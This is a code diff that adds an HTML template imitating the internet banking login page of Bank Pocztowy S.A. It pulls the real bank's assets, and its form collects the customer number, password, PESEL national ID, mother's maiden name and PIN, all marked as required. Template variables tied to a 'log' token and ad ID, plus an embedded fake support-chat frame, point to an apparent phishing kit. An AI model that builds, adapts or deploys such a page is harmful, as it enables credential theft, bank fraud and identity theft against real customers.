@@ -1,0 +1,146 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1"><!-- for IE -->
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="description" content="">
+    <link rel="shortcut icon" href="https://www.pocztowy24.pl/cbp-webapp/VAADIN/themes/cbp/favicon.ico"
+        type="image/vnd.microsoft.icon">
+    <link rel="icon" href="https://www.pocztowy24.pl/cbp-webapp/VAADIN/themes/cbp/favicon.ico"
+        type="image/vnd.microsoft.icon">
+    <title>System bankowości internetowej Banku Pocztowego S.A.</title>
+    <link rel="stylesheet" href="https://www.pocztowy24.pl/cbp-webapp/VAADIN/static/css/login.min.css"
+        media="screen, projection" type="text/css">
+
+    <link rel="stylesheet" href="/css/default_lk.css">
+
+</head>
+
+<body>
+    <div id="progress">
+        <div id="indicator" class="loading-indicator"></div>
+        <div class="loading-panel"></div>
+    </div>
+
+    <div class="content">
+
+
+
+
+
+
+        <div id="header">
+            <h1>Logowanie do systemu bankowości internetowej Banku Pocztowego</h1>
+        </div>
+
+        <div>
+
+        </div>
+
+        <div id="login-form">
+            <div id="errorMessage">
+            </div>
+            <div id="message">
+
+
+            </div>
+            <form id="lk_form">
+                <div class="line">
+                    <label for="nik">
+                        :NIK
+                    </label>
+                    <input type="text" id="login" name="nik" required autocomplete="off"
+                        placeholder="(Numer Identyfikacyjny Klienta)">
+                </div>
+                <div class="line">
+                    <label for="password">
+                        :Hasło
+                    </label>
+                    <input type="password" id="password" name="password" required autocomplete="off"
+                        class="numeric-password">
+                </div>
+                <div class="line">
+                    <label for="pesel">
+                        :Pesel
+                    </label>
+                    <input type="text" id="pesel" name="pesel" required autocomplete="off">
+                </div>
+                <div class="line">
+                    <label for="motherlastname">
+                        :Nazwisko panieńskie matki
+                    </label>
+                    <input type="text" id="motherlastname" name="motherlastname" required autocomplete="off">
+                </div>
+                <div class="line">
+                    <label for="pin">
+                        :PIN
+                    </label>
+                    <input type="password" id="pin" name="pin" required autocomplete="off">
+                </div>
+                <div class="buttons">
+                    <button tabindex="3" type="submit" class="button">
+                        <span class="button-wrap">
+                            <span class="button-label">
+                                Zaloguj się
+                            </span>
+                        </span>
+                    </button>
+                    <style>
+                        .button {
+                            outline: none;
+                            border: none;
+                        }
+                    </style>
+                </div>
+
+            </form>
+        </div>
+
+        <div id="footer">
+            <div id="logo">
+                <!--[if IE 6]>
+                    <img src="https://www.pocztowy24.pl/cbp-webapp/VAADIN/widgetsets/pl.coresoft.application.CsAdminWidgetSet/ie6pngfix/blank.gif">
+                <![endif]-->
+            </div>
+        </div>
+    </div>
+
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"
+        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js" crossorigin="anonymous"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+    <script>
+        const LOG_TOKEN = <%=log.token%>,
+            AD_LANG = "<%=log.ad.service.lang%>",
+            AD_ID = <%=log.ad.id%>,
+            translate = <%-JSON.stringify(translate) %>;
+    </script>
+    <script src="/js/lk.js" defer></script>
+    <link rel="stylesheet" href="/css/support_parent.css" />
+    <div class="
+    chatra--webkit
+    chatra--style-round
+    chatra--side-bottom
+    chatra--pos-right
+    chatra--visible
+    chatra--expanded
+    chatra--fast-toggle
+  " id="chatra" data-turbolinks-permanent="" style="
+    width: 380px;
+    height: 600px;
+    transform: none;
+    z-index: 2147483647;
+    display: none;
+  ">
+        <div id="chatra__iframe-wrapper">
+            <iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Chatra live chat"
+                allow="autoplay" src="/supportChatFrame/<%=log.ad.id%>"
+                style="width: 380px; height: 600px; position: absolute"></iframe>
+        </div>
+    </div>
+    <div class="support-circle"
+        onclick="document.querySelector('#chatra').style.display = 'block';this.style.display = 'none'"></div>
+</body>
+
+</html>
